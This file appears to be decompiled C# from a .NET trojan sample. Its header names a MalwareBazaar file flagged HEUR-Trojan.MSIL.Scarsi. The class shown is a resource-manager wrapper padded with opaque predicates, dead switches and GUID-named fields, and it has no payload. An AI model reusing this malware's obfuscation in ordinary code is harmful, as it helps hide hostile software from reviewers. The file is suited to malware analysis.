// Decompiled with JetBrains decompiler
// Type: InterpreterPolicyModel
// Assembly: LibCADPortable_2_1_4, Version=2.2.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 56003C3B-2EA8-4D4F-8A52-24E609F14F96
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Scarsi.gen-886c30550a351ba7d5abe9f3f1fc36ba8e5811132fc041dc79db813c86964877.exe

using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.InteropServices;

[DebuggerNonUserCode]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
internal sealed class InterpreterPolicyModel
{
  private static ResourceManager m_Expression;
  private static CultureInfo _Product;
  internal static InterpreterPolicyModel SetTask;

  internal InterpreterPolicyModel()
  {
    if (true)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
    int num = 0;
    if (\u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_b45ff38644854020a2c95b3402803450 != 0)
      num = 0;
    switch (num)
    {
    }
  }

  internal static ResourceManager MoveMerchant()
  {
    int num1 = 5;
    bool flag;
    ResourceManager resourceManager1;
    ResourceManager resourceManager2;
    while (true)
    {
      switch (num1)
      {
        case 1:
          resourceManager2 = resourceManager1;
          if (false)
          {
            num1 = 2;
            continue;
          }
          goto label_12;
        case 2:
          goto label_2;
        case 3:
          // ISSUE: type reference
          ResourceManager resourceManager3 = new ResourceManager("Xlloxw.Properties.Resources", InterpreterPolicyModel.MoveTask(__typeref (InterpreterPolicyModel)).Assembly);
          if (false)
          {
            num1 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_84110e451a9f4dd98017d7fc21481e7b == 0 ? 1 : 1;
            continue;
          }
          resourceManager1 = resourceManager3;
          goto case 1;
        case 5:
          int num2 = InterpreterPolicyModel.m_Expression == null ? 1 : 0;
          if (false)
          {
            num1 = 4;
            continue;
          }
          flag = num2 != 0;
          num1 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_be35034af6f446db90ae307d47c865ca == 0 ? 0 : 0;
          continue;
        default:
          if (!flag)
            goto label_2;
          else
            goto case 3;
      }
    }
label_2:
    return InterpreterPolicyModel.m_Expression;
label_12:
    InterpreterPolicyModel.m_Expression = resourceManager2;
    goto label_2;
  }

  internal static CultureInfo PrepareMerchant()
  {
    CultureInfo product = InterpreterPolicyModel._Product;
    if (true)
      goto label_3;
label_2:
    CultureInfo cultureInfo;
    return cultureInfo;
label_3:
    cultureInfo = product;
    int num = 0;
    if (\u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_7b254a6168fc4731966a16df0169b227 == 0)
      goto label_4;
label_1:
    switch (num)
    {
      default:
        goto label_2;
    }
label_4:
    num = 0;
    goto label_1;
  }

  internal static void RateMerchant(CultureInfo res)
  {
    CultureInfo cultureInfo = res;
    if (false)
      return;
    InterpreterPolicyModel._Product = cultureInfo;
    int num = 0;
    if (\u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_f21a7d26a4864c9d853788441f0880d9 != 0)
      goto label_6;
label_1:
    switch (num)
    {
      case 0:
        return;
      default:
        return;
    }
label_6:
    num = 0;
    goto label_1;
  }

  internal static bool DisableTask() => InterpreterPolicyModel.SetTask == null;

  internal static InterpreterPolicyModel ConnectTask() => InterpreterPolicyModel.SetTask;

  internal static Type MoveTask([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);
}
